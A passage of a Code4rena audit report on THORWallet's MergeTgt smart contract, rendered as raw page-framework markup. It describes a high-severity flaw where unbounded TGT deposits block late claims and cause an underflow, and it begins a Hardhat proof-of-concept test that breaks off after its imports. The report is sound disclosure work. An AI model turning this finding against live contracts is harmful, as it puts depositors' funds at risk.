Bslug%5D/page-220cafabfbe0a147.js\"],\"default\"]\nd:[\"$\",\"html\",null,{\"lang\":\"en\",\"className\":\"dark __variable_145019 __variable_7d3254 __variable_38ceec\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L11\",null,{\"hasLoginHistory\":true,\"children\":[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"template"])</script><script>self.__next_f.push([1,"Styles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"$L12\",null,{}],\"notFoundStyles\":[]}]}]}]}]\n15:T302de,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the THORWallet smart contract system. The audit took place from February 20, 2025 to February 26, 2025.\u003c/p\u003e\n\u003cp\u003eThis audit was judged by \u003ca href=\"https://code4rena.com/@0xnev\"\u003e0xnev\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@shaflow2\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@web3km\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/@kn0t\"\u003ekn0t\u003c/a\u003e) reviewed the mitigations for all identified issues; the \u003ca href=\"#mitigation-review\"\u003emitigation review report\u003c/a\u003e is appended below the audit report.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 3 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 1 received a risk rating in the category of MEDIUM severity.\u003c/p\u003e\n\u003cp\u003eAdditionally, C4 analysis included 9 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet\"\u003eC4 THORWallet repository\u003c/a\u003e, and is composed of 2 smart contracts written in the Solidity programming language and includes 216 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"high-risk-findings-2\" style=\"position:relative;\"\u003e\u003ca href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eHigh Risk Findings (2)\u003c/h1\u003e\n\u003ch2 id=\"h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period\" style=\"position:relative;\"\u003e\u003ca href=\"#h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period\" aria-label=\"h 1 mergetgt has no handling if tgttoexchange is exceeded during the exchange period permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-6\"\u003e[H-1] MergeTgt has no handling if TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE is exceeded during the exchange period\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-171\"\u003ejsonDoge\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-88\"\u003e0x41head\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-87\"\u003e0xAsen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-146\"\u003e0xastronatey\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-473\"\u003e0xbrett8571\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-218\"\u003e0xd4ps\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-379\"\u003e0xgh0stcybers3c\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-61\"\u003e0xGondar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-269\"\u003e0xLeveler\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-789\"\u003e0xlucky\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-584\"\u003e0xTonraq\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-253\"\u003e4B\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-783\"\u003eAbhan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-529\"\u003eagadzhalov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-49\"\u003eanchabadze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-705\"\u003earman\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-149\"\u003earnie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-745\"\u003easter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-411\"\u003eBenterkiii\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-283\"\u003eboredpukar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-345\"\u003eBz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-200\"\u003eChainSentry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-201\"\u003eChainSentry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-204\"\u003eChainSentry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-493\"\u003eColdless\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-219\"\u003ecrmx_lom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-701\"\u003eDaniel_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-733\"\u003eDaniel_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-10\"\u003eDaniel526\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-12\"\u003eDaniel526\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-667\"\u003eDemoreX\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-766\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-108\"\u003eeldar_m10v\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-790\"\u003eewwrekt\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-809\"\u003ehjo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-628\"\u003eIceBear\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-491\"\u003eIlloy-Scizceneghposter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-652\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-660\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-661\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-359\"\u003eITCruiser\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-174\"\u003ejkk812812\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-453\"\u003eKannAudits\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-720\"\u003eKannAudits\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-433\"\u003ekn0t\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-481\"\u003eleegh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-375\"\u003eMSK\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-195\"\u003eMylifechangefast_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-197\"\u003eMylifechangefast_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-686\"\u003enatachi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-658\"\u003epeanuts\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-565\"\u003ephoenixV110\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-562\"\u003eREKCAH\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-189\"\u003esafie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-184\"\u003esaikumar279\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-250\"\u003eSaurabh_Singh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-403\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-140\"\u003esilver_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-635\"\u003esohrabhind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-649\"\u003esohrabhind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-535\"\u003eStriking_Lions\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-792\"\u003eTakarez\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-107\"\u003eteoslaf\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-181\"\u003etpiliposian\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-426\"\u003eUzeyirCh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-616\"\u003ew33kEd\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-603\"\u003ewahedtalash77\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-114\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-56\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-639\"\u003eyaioxy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-221\"\u003ezhanmingjing\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-147\"\u003ezraxx\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-236\"\u003eZZhelev\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L81\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L81\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eMergeTgt has hardcoded amounts of TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE and TITN\u003cem\u003eARB. Their ratio is used for rate calculation and TITN\u003c/em\u003eARB amount of TITN is deposited to be claimed.\u003c/p\u003e\n\u003cp\u003eThe contract has no actual logic which would limit the deposited Tgt to MergeTgt. This means if this amount is crossed, any last claimers will not be able to do so or retrieve their Tgt back.\u003c/p\u003e\n\u003cp\u003eThis same vulnerability also introduces an overflow in \u003ccode\u003ewithdrawRemainingTitn\u003c/code\u003e. Since TGT is allowed to exceed the hardcoded value, the claimable TINT exceeds the actual mergeTgt contract TITN balance.\u003c/p\u003e\n\u003cp\u003eAnd this line overflows, as \u003ccode\u003eremainingTitnAfter1Year\u003c/code\u003e becomes less than the \u003ccode\u003einitialTotalClaimable\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003euint256 unclaimedTitn = remainingTitnAfter1Year - initialTotalClaimable;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLikelihood: Medium - The total Tgt of all users has to exceed TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE. According to blockchain explorers, ARB has 447,034,102 and ETH has 897,791,792, which is more than double the TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE of 579,000,000, so quite likely.\u003c/p\u003e\n\u003cp\u003eImpact: High - loss of user funds and breaking contract logic (revert on claim).\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eA modified MNrgeTgt.test.ts. Main modifications:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTGT total supply is increased above 579\u003cem\u003e000\u003c/em\u003e000 \u003c/li\u003e\n\u003cli\u003eAll user total TGT deposit to mergeTGT is above 579\u003cem\u003e000\u003c/em\u003e000 \u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSteps in tests:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUser1 deposits 100 TGT\u003c/li\u003e\n\u003cli\u003eUser2 deposits 578999999 TGT\u003c/li\u003e\n\u003cli\u003eUser1 claims successfully\u003c/li\u003e\n\u003cli\u003eUser2 claim fails due to mergeTgt not having enough TITN.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSignerWithAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;@nomiclabs/hardhat-ethers/signers\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;@nomicfoundation/hardhat-network-helpers\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;chai\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;ethers\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployments\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;hardhat\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;@layerzerolabs/lz-v2-utilities\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Audit MergeTgt tests\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () 